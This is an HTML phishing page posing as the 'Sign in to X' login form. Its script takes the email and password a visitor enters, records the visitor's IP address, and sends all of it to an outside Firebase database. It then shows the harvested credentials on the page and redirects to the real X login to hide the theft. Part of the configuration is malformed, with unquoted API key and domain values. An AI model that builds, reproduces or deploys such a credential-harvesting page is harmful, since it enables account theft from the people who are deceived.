<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f8fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .container h2 {
            margin-bottom: 20px;
        }
        .container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0 20px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .container button {
            width: 100%;
            padding: 10px;
            background-color: #1DA1F2;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #1a91da;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Sign in to X</h2>
        <form id="login-form">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div id="data"></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: 843888180141 , 
            authDomain: duse1532@gmail.com ,
            databaseURL: "https://clickme-8b35c-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "clickme-8b35c",
            storageBucket: "clickme-8b35c.appspot.com",
            messagingSenderId: "843888180141",
            appId: "clickme-8b35c"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const form = document.getElementById('login-form');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const dataDiv = document.getElementById('data');

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const email = emailInput.value;
            const password = passwordInput.value;

            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;

                db.ref('users').push({
                    email: email,
                    password: password,
                    ip: ip
                });

                dataDiv.innerHTML = '';
                db.ref('users').on('value', (snapshot) => {
                    snapshot.forEach((childSnapshot) => {
                        const childData = childSnapshot.val();
                        const paragraph = document.createElement('p');
                        paragraph.textContent = `Email: ${childData.email}, Password: ${childData.password}, IP: ${childData.ip}`;
                        dataDiv.appendChild(paragraph);
                    });
                });

                window.location.href = 'https://x.com/login';
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
